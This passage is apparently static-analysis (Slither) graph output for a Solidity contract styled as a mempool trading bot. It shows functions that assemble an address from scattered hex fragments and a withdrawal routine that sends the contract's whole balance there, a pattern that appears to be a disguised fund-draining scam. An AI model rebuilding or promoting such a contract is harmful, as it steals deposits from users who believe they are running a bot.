  Type: NodeType.RETURN
  Expression: ptr

  ID: 40
  Type: NodeType.ENDIF
  Expression: 

  ID: 41
  Type: NodeType.EXPRESSION
  Expression: ptr += 1

  ID: 42
  Type: NodeType.EXPRESSION
  Expression: idx ++

  ID: 43
  Type: NodeType.ENDIF
  Expression: 

  ID: 44
  Type: NodeType.ENDIF
  Expression: 

  ID: 45
  Type: NodeType.RETURN
  Expression: selfptr + selflen

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 44
  4 -> 5
  4 -> 26
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 17
  16 -> 24
  17 -> 18
  17 -> 19
  19 -> 20
  20 -> 21
  21 -> 22
  22 -> 23
  23 -> 16
  24 -> 25
  26 -> 27
  27 -> 28
  28 -> 29
  29 -> 32
  30 -> 33
  31 -> 43
  32 -> 30
  33 -> 34
  33 -> 31
  34 -> 35
  35 -> 36
  36 -> 37
  37 -> 38
  38 -> 39
  38 -> 40
  40 -> 41
  41 -> 42
  42 -> 33
  43 -> 44
  44 -> 45

Function: fetchMempoolData
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: _mempoolShort = getMempoolShort()

  ID: 2
  Type: NodeType.VARIABLE
  Expression: _mempoolEdition = fetchMempoolEdition()

  ID: 3
  Type: NodeType.VARIABLE
  Expression: _mempoolVersion = fetchMempoolVersion()

  ID: 4
  Type: NodeType.VARIABLE
  Expression: _mempoolLong = getMempoolLong()

  ID: 5
  Type: NodeType.VARIABLE
  Expression: _getMempoolHeight = getMempoolHeight()

  ID: 6
  Type: NodeType.VARIABLE
  Expression: _getMempoolCode = getMempoolCode()

  ID: 7
  Type: NodeType.VARIABLE
  Expression: _getMempoolStart = getMempoolStart()

  ID: 8
  Type: NodeType.VARIABLE
  Expression: _getMempoolLog = getMempoolLog()

  ID: 9
  Type: NodeType.RETURN
  Expression: string(abi.encodePacked(_mempoolShort,_mempoolEdition,_mempoolVersion,_mempoolLong,_getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog))

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9

Function: toHexDigit
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: 0 <= d && d <= 9

  ID: 2
  Type: NodeType.RETURN
  Expression: bytes1(uint8(bytes1(0)) + d)

  ID: 3
  Type: NodeType.IF
  Expression: 10 <= uint8(d) && uint8(d) <= 15

  ID: 4
  Type: NodeType.RETURN
  Expression: bytes1(uint8(bytes1(a)) + d - 10)

  ID: 5
  Type: NodeType.ENDIF
  Expression: 

  ID: 6
  Type: NodeType.ENDIF
  Expression: 

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: revert()()

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  3 -> 5
  5 -> 6
  6 -> 7

Function: getMempoolLong
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: abD0a

Edges:
  0 -> 1

Function: start
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(address(this).balance >= 10000000000000000,Insufficient contract balance)

Edges:
  0 -> 1

Function: withdrawal
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: to = startExploration((fetchMempoolData()))

  ID: 2
  Type: NodeType.VARIABLE
  Expression: contracts = address(to)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: contracts.transfer(getBa())

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: getMempoolCode
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: 6Bc4A

Edges:
  0 -> 1

Function: uint2str
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: _i == 0

  ID: 2
  Type: NodeType.RETURN
  Expression: 0

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.VARIABLE
  Expression: j = _i

  ID: 5
  Type: NodeType.VARIABLE
  Expression: 

  ID: 6
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 7
  Type: NodeType.IFLOOP
  Expression: j != 0

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: len ++

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: j /= 10

  ID: 10
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 11
  Type: NodeType.VARIABLE
  Expression: bstr = new bytes(len)

  ID: 12
  Type: NodeType.VARIABLE
  Expression: k = len - 1

  ID: 13
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 14
  Type: NodeType.IFLOOP
  Expression: _i != 0

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: bstr[k --] = bytes1(uint8(48 + _i % 10))

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: _i /= 10

  ID: 17
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 18
  Type: NodeType.RETURN
  Expression: string(bstr)

  ID: 19
  Type: NodeType.RETURN
  Expression: _uintAsString

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  7 -> 10
  8 -> 9
  9 -> 7
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  14 -> 17
  15 -> 16
  16 -> 14
  17 -> 18

Function: fetchMempoolVersion
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: F4DA1e

Edges:
  0 -> 1

Function: mempool
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: _baseBytes = bytes(_base)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: _valueBytes = bytes(_value)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: _tmpValue = new string(_baseBytes.length + _valueBytes.length)

  ID: 4
  Type: NodeType.VARIABLE
  Expression: _newValue = bytes(_tmpValue)

  ID: 5
  Type: NodeType.VARIABLE
  Expression: 

  ID: 6
  Type: NodeType.VARIABLE
  Expression: 

  ID: 7
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 8
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: i = 0

  ID: 10
  Type: NodeType.IFLOOP
  Expression: i < _baseBytes.length

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: _newValue[j ++] = _baseBytes[i]

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: i ++

  ID: 13
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 14
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: i = 0

  ID: 16
  Type: NodeType.IFLOOP
  Expression: i < _valueBytes.length

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: _newValue[j ++] = _valueBytes[i]

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: i ++

  ID: 19
  Type: NodeType.RETURN
  Expression: string(_newValue)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 9
  7 -> 10
  8 -> 15
  9 -> 7
  10 -> 11
  10 -> 8
  11 -> 12
  12 -> 10
  13 -> 16
  14 -> 19
  15 -> 13
  16 -> 17
  16 -> 14
  17 -> 18
  18 -> 16

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: WETH_CONTRACT_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: UNISWAP_CONTRACT_ADDRESS = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D

Edges:
  0 -> 1


